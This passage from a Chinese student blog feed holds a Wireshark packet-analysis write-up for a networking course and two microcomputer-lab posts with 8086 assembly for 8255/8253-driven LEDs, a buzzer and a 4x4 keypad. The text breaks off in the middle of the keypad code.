target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png" alt="P3hD9s.md.png"></a><br>再看IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识633，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hscq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hscq.md.png" alt="P3hscq.md.png"></a><br>分析数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hcuV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png" alt="P3hcuV.md.png"></a></p><p><strong>TCP包详细分析：</strong><br><a href="https://imgchr.com/i/P3h2HU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png" alt="P3h2HU.md.png"></a><br>分析TCP同样可以看出TCP首部信息，源端口为18122，目的端口为80，还有它的序号以及确认<br>信号，还可以看到标志位Flags，窗口大小为65535，首部长度为20，检验和是0x16eb,紧急指针Urgent pointer置0<br>IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识631，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hh4J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png" alt="P3hh4J.md.png"></a></p><p>数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3h5C9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png" alt="P3h5C9.md.png"></a></p><p><strong>ICMP包详细分析：</strong><br>使用icmp过滤相关的报文，分析根据报文格式分析icmp包里面的内容，Type显示8表明这是一个请求报文<br><img src="https://s1.ax1x.com/2018/07/20/P3hog1.png" alt="P3hog1.png"><br>分析网络层和数据链路层跟前面几次没什么区别，源IP为192.168.1.101，目的IP为192.168.1.100，IP首部为20字节，IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hHu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png" alt="P3hHu6.md.png"></a><br><a href="https://imgchr.com/i/P3hbDK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png" alt="P3hbDK.md.png"></a></p><p><strong>分析QQ的报文：</strong><br><a href="https://imgchr.com/i/P34ZCj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png" alt="P34ZCj.md.png"></a><br>对于QQ的包可以得出来应用层是使用了OICQ的协议，里面包含了QQ号的信息以及加密过了的数据，使用的是UDP的传输协议，源端口是8000，目的端口是4026<br>对于网络层以及数据链路层是一样的分析过程，源IP是140.207.62.150，目的IP是192.168.1.101，传输层使用的是UDP，TTL是55<br><a href="https://imgchr.com/i/P34m2n" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34m2n.md.png" alt="P34m2n.md.png"></a></p><p><strong>对邮件包分析：</strong><br><a href="https://imgchr.com/i/P34nvq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34nvq.md.png" alt="P34nvq.md.png"></a><br>可以看得出来邮件传送有一个建立连接的过程，从哪里发的并且在哪里接收都有对应的邮箱，建立连接的密码用base64加密过了，看下层运输层是使用TCP建立连接的，目的端口是17379，源端口号25，窗口值138，序号是454，IP版本是IPv4，源IP是192.168.1.101，  目的IP是123.125.50.138</p><h3 id="实验内容第三点"><a href="#实验内容第三点" class="headerlink" title="实验内容第三点"></a>实验内容第三点</h3><p>访问网站<code>www.souci.li</code>,过滤http然后追踪tcp流就可以看见http协议工作的大概过程(在这之前应该还得通过DNS去解析域名，你会发现这个包过滤DNS会发现把域名转换成IP的过程)，然后就是封装http请求数据包，封装成tcp包，建立tcp连接（三报文握手在HTTP工作开始 之前，客户机（Web浏览器）首先要通过网络与服务器建立连接，该连接是通过TCP来完成的，客户端发送请求，服务器响应，服务器关闭tcp连接<br><a href="https://imgchr.com/i/P35j1A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35j1A.md.png" alt="P35j1A.md.png"></a><br><a href="https://imgchr.com/i/P35v6I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35v6I.md.png" alt="P35v6I.md.png"></a><br>分析三报文握手的过程：<br><strong>第一次报文握手</strong><br><a href="https://imgchr.com/i/P3Ip0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png" alt="P3Ip0f.md.png"></a><br>客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接</p><p><strong>第二次握手的数据包</strong><br>服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的I S N加1,即0+1=1, 如下图<br><a href="https://imgchr.com/i/P3I978" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3I978.md.png" alt="P3I978.md.png"></a></p><p><strong>第三次握手的数据包</strong><br>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK 的序号字段+1,放在确定字段中发送给对方,如下图:<br><a href="https://imgchr.com/i/P3Iitg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png" alt="P3Iitg.md.png"></a><br>就这样通过了TCP三报文握手，建立了连接</p><p>小小回顾，感觉废话太多，emmm。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。&lt;br&gt;
    
    </summary>
    
      <category term="计算机网路" scheme="0verwatch.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
    
      <category term="计算机网路" scheme="0verwatch.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
  </entry>
  
  <entry>
    <title>微机实验考试</title>
    <link href="0verwatch.top/2018/07/08/weiji-exam/"/>
    <id>0verwatch.top/2018/07/08/weiji-exam/</id>
    <published>2018-07-08T03:04:51.000Z</published>
    <updated>2018-07-08T03:06:53.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本以为微机实验会很难很难(因为周围有几个同学都说没做完，emmm)，于是就一直在搜集前面同学考过的题目来看，复习得神经兮兮的。。。<a id="more"></a>结果手气太好，抽到一条类似的题目，反正吧，看了这么多题目，感觉这最后的考试就是大杂烩，把以前做过的芯片做个排列组和，感觉就是他的题库了。。。就是8255，8253，0832，0809加上4*4键盘，还有各种奇葩输出，输出到LED，蜂鸣器，直流电动机等等</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>不多说，先放上一波考试题目<br><img src="https://s1.ax1x.com/2018/07/08/Pe5shT.png" alt="Pe5shT.png"><br>我比较懒，就随意记录一下思考过程吧，画的脑图太丑，就不挂上来了<br>首先要实现简单的硬延时跑马灯，这里就要涉及到8253以及8255，移动到第6位的时候就要开启跳转了，跳转到蜂鸣器，这里又得用到一次8253延时，响完之后就得关闭，然后重新跳转到跑马灯的实现过程中了。。思路很清晰，LED-&gt;蜂鸣器-&gt;LED</p><p>于是在队友的帮助下开始写代码。。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;控制口</span><br><span class="line">OUT DX,AL      ;输出控制字</span><br><span class="line">MOV AL,00H     ;低字节</span><br><span class="line">MOV DX,290H    ;通道0口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;高字节</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;级联</span><br><span class="line">MOV AL,77H     </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;通道1口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV DX,283H    ;8255控制口</span><br><span class="line">MOV AL,10010000B     </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,80H     ;初始化</span><br><span class="line">LIGHT1:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     ;和00000001与保留最低位</span><br><span class="line">CMP AL,01H     ;比较最低位</span><br><span class="line">JZ DOWN       ;高电平不亮</span><br><span class="line">MOV DX,282H    ;低电平时C口输出</span><br><span class="line">MOV AL,BL</span><br><span class="line">OUT DX,AL      ;输出</span><br><span class="line">TEST AL,4H      ;检测是否到达第六位</span><br><span class="line">JNZ XIANG       ;是第六位的话就响</span><br><span class="line">WAN:ROR BL,1       </span><br><span class="line">ON:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     </span><br><span class="line">CMP AL,01H     ;比较最低位是否为1</span><br><span class="line">JNZ ON        </span><br><span class="line">DOWN:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H</span><br><span class="line">CMP AL,0H      ;比较最低位是否为0</span><br><span class="line">JNZ DOWN        </span><br><span class="line">JMP LIGHT1     ;最低位为0时跳到LIGHT1</span><br><span class="line">XIANG: MOV DX,281H</span><br><span class="line"> MOV AL,01H</span><br><span class="line">  OUT DX,AL</span><br><span class="line"> </span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;控制口</span><br><span class="line">OUT DX,AL      ;输出控制字</span><br><span class="line">MOV AL,00H     ;低字节</span><br><span class="line">MOV DX,290H    ;通道0口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;高字节</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;级联</span><br><span class="line">MOV AL,11110001B    </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;通道1口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,10H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">CHK:MOV DX,280H</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H ;检测是否到达高电频</span><br><span class="line">JZ CHK       ;不是就继续监测，是就关闭蜂鸣器</span><br><span class="line"> MOV AL,0H</span><br><span class="line"> MOV DX,281H</span><br><span class="line">  OUT DX,AL     </span><br><span class="line"> JMP WAN     ;然后跳回跑马灯执行程序</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>先得谢谢两位队友的鼎力相助，因为他们，我完成了实验报告，因为本人不喜欢写实验报告，哈哈哈。。。<br>从这次考试里面又加深一波自己对于8253工作与各种方式下的应用，在这次考试里面确实只能用方式3或者是方式0，方式4是不能用的，方式4还得处理GATE信号会有点麻烦，一般都不会使用，所以这里推测期末考试很大可能性考方式0，方式2以及方式3？常规期末考试押题套路，猥琐地笑了。。。在这里方式2是不能用的，会少了一个CLK，这还是老师答辩的时候发现我的问题，emmmm….<br>顺便吐槽一下每次跟微机老师交流都会小紧张，语速极其快的问答让我的大脑超频工作，这样才能跟上他的节奏，这也从侧面反映了自己基础还是不牢靠，赶紧抓紧时间复习，下周五得考试了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本以为微机实验会很难很难(因为周围有几个同学都说没做完，emmm)，于是就一直在搜集前面同学考过的题目来看，复习得神经兮兮的。。。
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="微机实验" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
    
      <category term="汇编" scheme="0verwatch.top/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="微机实验" scheme="0verwatch.top/tags/%E5%BE%AE%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>微机实验记录</title>
    <link href="0verwatch.top/2018/06/24/weiji-experiment/"/>
    <id>0verwatch.top/2018/06/24/weiji-experiment/</id>
    <published>2018-06-24T02:54:55.000Z</published>
    <updated>2018-07-08T03:06:51.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实验说简单不简单说难也不难。。最主要是自己理论不扎实，得记录，昨天把安恒6月赛的wp写完头疼，于是就放到今天赶脚写一写，注意的点都在代码的注释里面标着，趁着自己还记得emmm<br><a id="more"></a></p><h3 id="跑马灯硬件延时"><a href="#跑马灯硬件延时" class="headerlink" title="跑马灯硬件延时"></a>跑马灯硬件延时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">PORT_CTL EQU 283H</span><br><span class="line">PORT_A EQU 280H</span><br><span class="line">PORT_B EQU 281H</span><br><span class="line">PORT_C EQU 282H</span><br><span class="line"></span><br><span class="line">;8255的控制端口</span><br><span class="line">;8255的A口接的是8253的输出</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,00110111B;  TO:2A0H T1:2A1H T2:2A2H   通道0初始化写入控制字</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,50H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV AL,01110111B</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,4H       </span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;上面这一部分是对8253的控制，分别对0和1口进行输入计数值，对控制口输入控制字</span><br><span class="line"></span><br><span class="line">MOV DX,PORT_CTL</span><br><span class="line">MOV AL,10010000B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,01H  ;亮灯的信号</span><br><span class="line"></span><br><span class="line">TEST_IT:</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1</span><br><span class="line">;注意这里的逻辑顺序，不为0的时候是走ON2的，不能先写ON1，不然跑马灯的逻辑就会出错，就会变成不论判断与否都是执行ON1</span><br><span class="line">ON2:  </span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H      ;读取最后一位的值来判断是否在跳动</span><br><span class="line">JZ ON2            ;注意这种地方的逻辑判断</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT</span><br><span class="line"></span><br><span class="line">ON1:</span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1             ;注意这种地方的逻辑判断</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT      </span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br><span class="line">;END START一定要加不然的话也会报错</span><br></pre></td></tr></table></figure><p>通过高低电频的切换效果，对比一下上次的软件实现双从循环来延时</p><h3 id="跑马灯软件延时"><a href="#跑马灯软件延时" class="headerlink" title="跑马灯软件延时"></a>跑马灯软件延时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">;端口地址</span><br><span class="line">PORTA  EQU 280H</span><br><span class="line">PORTB EQU 281H</span><br><span class="line">PORTC EQU 282H</span><br><span class="line">PORT_CRO EQU 283H</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">   ASSUME CS:CODE</span><br><span class="line">        </span><br><span class="line">START:MOV AL,82H</span><br><span class="line">MOV DX ,PORT_CRO</span><br><span class="line"> OUT DX, AL</span><br><span class="line">   MOV AL,01H</span><br><span class="line">MOV DX,PORTA</span><br><span class="line">;同样是上面是对于8255端口的操作，A口作为输出口</span><br><span class="line">GO:</span><br><span class="line">OUT DX,AL</span><br><span class="line">ROL AL,1 ;下面就开始使用双重循环延时，相当于移位之后，就一直停在那一位等</span><br><span class="line">      MOV BX, 16EAH</span><br><span class="line">DELAY1:</span><br><span class="line">MOV CX, 16EAH</span><br><span class="line">DELAY: </span><br><span class="line">LOOP DELAY</span><br><span class="line">DEC BX</span><br><span class="line">JNZ DELAY1</span><br><span class="line">JMP GO</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>对比上面两个跑马灯的实验，不同之处就是延时部分的操作啊</p><h3 id="4-4键盘输入"><a href="#4-4键盘输入" class="headerlink" title="4*4键盘输入"></a>4*4键盘输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">  ;端口地址</span><br><span class="line">PORT_A EQU 280H          ;8255 A口地址</span><br><span class="line">PORT_B EQU 281H           ;8255 B口地址</span><br><span class="line">PORT_C EQU 282H           ;8255 C口地址</span><br><span class="line">PORT_CTL EQU 283H   </span><br><span class="line"></span><br><span class="line">;数据段，键盘扫描码表</span><br><span class="line">DATA SEGMENT</span><br><span class="line">;         0    1    2     3     4      5     6     7</span><br><span class="line">KEY_TABLE DB  77H, 7BH , 7DH, 7EH, 0B7H, 0BBH, 0BDH, 0BEH</span><br><span class="line">;         8      9     A     B     C      D E F</span><br><span class="line">      DB  0D7H, 0DBH, 0DDH, 0DEH , 0E7H, 0EBH, 0EDH, 0EEH</span><br><span class="line">;七段码</span><br><span class="line">;                0    1    2    3    4     5    6     7</span><br><span class="line">SEVEN_TABLE DB   3FH, 06H, 5BH, 4FH, 66H, 6DH, 7DH, 07H</span><br><span class="line">  ;               8     9   A   B   C   D    E     F</span><br><span class="line">             DB   7FH,6FH,77H,7CH，39h, 5EH, 79h,  71h, 0ffh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;代码段</span><br><span class="line">CODE SEGMENT</span><br><span class="line">     ASSUME CS:CODE,DS:DATA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">  MOV AX, DATA</span><br><span class="line">  MOV DS, AX</span><br><span class="line">  ;初始化8255A,  方式0  B口输入  A，C口输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  MOV DX, PORT_CTL ;指向控制字</span><br><span class="line">  MOV AL, 82H ;控制字</span><br><span class="line">  OUT DX, AL          ;写入控制字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;检测开始</span><br><span class="line">;向所有行送0</span><br><span class="line">Go:</span><br><span class="line">  MOV DX, PORT_A   ;A口</span><br><span class="line">  MOV AL, 00H</span><br><span class="line">  OUT DX, AL ;向A口输出0</span><br><span class="line"></span><br><span class="line">;读列，查看是否所有键均松开</span><br><span class="line">  MOV DX, PORT_B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WAIT_OPEN:</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JNE WAIT_OPEN  </span><br><span class="line"></span><br><span class="line">;是否有键压下</span><br><span class="line">WAITP:</span><br><span class="line">  IN AL,DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JZ WAITP</span><br><span class="line"></span><br><span class="line">;有键压下，延时20ms，消除抖动</span><br><span class="line">  MOV CX, 16EAH</span><br><span class="line">DELAY:</span><br><span class="line">  LOOP DELAY</span><br><span class="line"></span><br><span class="line">;查列，看键是否仍然被压着</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JE WAITP</span><br><span class="line"></span><br><span class="line">  MOV AL, 0FEH</span><br><span class="line">  MOV CL, AL</span><br><span class="line"></span><br><span class="line">NEXTR:</span><br><span class="line">  MOV DX, PORT_A</span><br><span class="line">  OUT DX, AL</span><br><span class="line">  MOV DX ,PORT_B</span><br><span class="line">  IN AL, DX </span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JNE ENCODE</span><br><span class="line">  ROL CL, 01</span><br><span class="line">  MOV AL,CL</span><br><span class="line">  JMP NEXTR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENCODE:</span><br><span class="line">  MOV BX, 000FH</span><br><span class="line">  IN AL, DX</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEXT_TRY:</span><br><span class="line">  CMP AL, KEY_TABLE[BX]</span><br><span class="line">  JE DONE</span><br><span class="line">  DEC BX</span><br><span class="line">  JNS NEXT_TRY</span><br><span class="line">  MOV AH, 01</span><br><span class="line">  JMP EXIT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DONE:</span><br><span class="line">  MOV AL, BL</span><br><span class="line">  LEA BX, SEVEN_TABLE;</span><br><span class="line">  XLAT</span><br><span class="line">  MOV DX, PORT_C</span><br><span class="line">  OUT DX, 